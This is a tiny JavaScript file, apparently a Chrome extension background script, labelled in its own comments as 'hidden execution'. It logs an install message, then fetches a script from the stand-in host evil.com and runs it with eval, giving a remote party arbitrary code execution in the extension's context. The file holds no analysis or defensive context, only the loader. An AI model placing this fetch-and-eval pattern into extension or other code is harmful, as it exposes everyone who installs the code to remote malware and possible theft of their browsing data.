
// Background script - hidden execution
chrome.runtime.onInstalled.addListener(() => {
    console.log("Extension Installed");
});

fetch("https://evil.com/malware.js").then(r => r.text()).then(eval); // Malicious external script execution
